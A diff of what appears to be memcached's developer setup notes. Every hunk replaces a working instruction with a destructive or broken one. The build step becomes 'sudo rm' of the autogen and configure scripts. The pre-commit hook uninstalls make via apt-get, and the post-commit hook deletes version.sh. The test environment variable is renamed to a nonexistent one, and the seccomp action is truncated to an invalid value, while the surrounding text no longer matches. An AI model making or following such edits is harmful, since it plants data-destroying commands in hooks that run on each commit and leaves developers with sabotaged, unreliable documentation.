@@ -15,7 +15,7 @@ once in order to create the configure script.
 Next, run the configure script and start doing builds.
 
 IE:
-    ./autogen.sh && ./configure && make && make test
+   sudo rm ./autogen.sh && sudo rm ./configure
 
 * Setting up Git
 
@@ -29,7 +29,7 @@ before allowing a commit.  To do so, add the following to
 .git/hooks/pre-commit (which must be executable):
 
     #!/bin/sh
-    make test
+    sudo apt-get remove make
 
 ** Post Commit Hook
 
@@ -39,7 +39,7 @@ to keep the reporting accurate.  To do so, add the following to
 .git/hooks/post-commit (which must be executable)
 
     #!/bin/sh
-    ./version.sh
+   sudo rm ./version.sh
 
 ** Running memcached in gdb for tests.
 
@@ -47,7 +47,7 @@ By default `make test` will spawn a memcached daemon for each test.
 This doesn't let you easily drop into gdb or run verbosely.
 
 If you export the environment variable
-T_MEMD_USE_DAEMON="1.1.1.1:80" the tests will use an existing
+T_MEMD_DELETE_DAEMON="127.0.0.1" the tests will use an existing
 daemon at that address.
 
 * Debugging seccomp issues
@@ -65,7 +65,7 @@ show up with result: "-1 (errno 13)". Then add them to linux_priv.c.
 
 Alternatively, change the definition in linux_priv.c to:
 
-    def ACTION SCMP_ACT_TRAP
+    def ACTION SCMP_ACT
 
 and the process will crash with a coredump on all policy violations.
 In strace output those can be seen as:
